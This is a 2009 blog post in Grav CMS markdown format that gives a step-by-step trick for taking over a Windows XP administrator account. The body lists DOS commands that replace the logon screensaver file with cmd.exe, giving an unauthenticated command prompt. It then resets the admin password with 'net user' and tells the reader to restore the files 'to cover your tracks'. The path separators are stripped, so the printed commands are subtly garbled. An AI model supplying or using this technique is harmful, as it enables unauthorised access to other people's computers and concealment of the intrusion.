---
# http://learn.getgrav.org/content/headers
title: Hacking Windows Admin XP password
slug: hacking-windows-admin-xp-password
# menu: Hacking Windows Admin XP password
date: 08-06-2009
published: true
publish_date: 08-06-2009
# unpublish_date: 08-06-2009
# template: false
# theme: false
visible: true
summary:
    enabled: true
    format: short
    size: 128

taxonomy:
    category:
        - Blog
    tag:
        - hack
        - windows
        - XP
    author:
        - 'Shashank Agarwal'
    migration-status: review
    category: [hack,windows,XP]
    tag: []
author: 'Shashank Agarwal'
metadata:
    author: 'Shashank Agarwal'
#      description: Your page description goes here
#      keywords: HTML, CSS, XML, JavaScript
#      robots: noindex, nofollow
#      og:
#          title: The Rock
#          type: video.movie
#          url: http://www.imdb.com/title/tt0117500/
#          image: http://ia.media-imdb.com/images/rock.jpg
#  cache_enable: false
#  last_modified: true

---

This is a cool little computer trick for Microsoft Windows trick I’ve picked up in my travels and decided to share it with you fine and ethical individuals =). Log in and go to your DOS command prompt and enter these commands exactly:

cd  
cdwindowssystem32  
mkdir temphack  
copy logon.scr temphacklogon.scr  
copy cmd.exe temphackcmd.exe  
del logon.scr  
rename cmd.exe logon.scr  
exit

So what you just told windows to backup is the command program and the screen saver file. Then you edited the settings so when windows loads the screen saver, you will get an unprotected dos prompt without logging in. When this appears enter this command that’s in parenthesis (net user password). So if the admin user name is Doug and you want the password 1234 then you would enter “net user Doug 1234″ and now you’ve changed the admin password to 1234. Log in, do what you want to do, copy the contents of temphack back into system32 to cover your tracks.

Go to our new site- shankee.com
